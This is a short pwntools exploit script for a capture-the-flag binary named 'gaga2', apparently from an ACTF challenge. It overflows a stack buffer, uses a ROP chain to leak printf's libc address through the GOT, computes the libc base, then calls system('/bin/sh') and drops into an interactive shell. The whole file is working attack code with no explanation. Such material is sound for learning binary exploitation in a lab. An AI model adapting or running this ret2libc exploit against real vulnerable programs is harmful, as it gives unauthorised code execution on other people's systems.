from pwn import *
context.binary=exe=ELF("./gaga2_patched",checksec=False)
libc=ELF('./libc6_2.31-0ubuntu9.9_amd64.so',checksec=False)
p=process(exe.path)
#p=remote('challs.actf.co',31302)
offset=0x48
pop_rdi=0x00000000004012b3
printf_plt=0x4010c0
ret=0x000000000040101a
pop_rsi_r15=0x00000000004012b1
def GDB():
    gdb.attach(p,gdbscript=
        '''
        b*0x000000000040124a
        c
        ''')
    input()
#GDB()
payload=b"A"*offset+flat(
    pop_rdi,exe.got['printf'],
    ret,
    printf_plt,exe.sym['main']+5
    )
p.sendlineafter(b"Your input: ",payload)
leak=int.from_bytes(p.recvuntil(b"Awesome!",drop=True),'little')
libc.address=leak-libc.sym['printf']
log.info('[+]printf:'+hex(leak))
log.info('[+]libc base:'+hex(libc.address))

payload=b"A"*offset+flat(
    pop_rdi,next(libc.search(b'/bin/sh')),
    pop_rsi_r15,0,0,
    libc.sym['system'],ret
    )
p.sendlineafter(b"Your input: ",payload)

p.interactive()